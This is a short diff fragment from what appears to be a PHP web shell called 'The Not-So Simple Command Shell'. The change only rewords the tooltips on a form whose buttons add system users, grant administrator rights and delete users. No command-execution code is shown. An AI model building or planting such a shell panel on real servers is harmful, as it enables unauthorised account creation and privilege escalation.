@@ -44,7 +44,7 @@
 		<form action="" method="get">
 		<input type="text" name="user" placeholder="user to alter" />&nbsp;&nbsp;<input type="text" name="pass" placeholder="password if adding user" />
 		<br><br>
-		<button type="submit" name="addUser" title="adds the secified user to the system with the password provided">Add User</button>&nbsp;<button type="submit" name="userAdmin" title="sets the specified user as adminstrator. only works with sufficient permissions on the current user">Set Admin</button>&nbsp;<button type="submit" name="delUser" title="deletes the specified user from the system">DelUser</button>
+		<button type="submit" name="addUser" title="adds the secified user to the system with the password provided.">Add User</button>&nbsp;<button type="submit" name="userAdmin" title="sets the specified user as adminstrator. only works with sufficient permissions on the current user.">Set Admin</button>&nbsp;<button type="submit" name="delUser" title="deletes the specified user from the system. only works with sufficient permissions on the current user.">DelUser</button>
 		</form>
 		<p style=""><small>The Not-So Simple Command Shell - Courtesy of KaotickJ</small></p>
 		</div>';
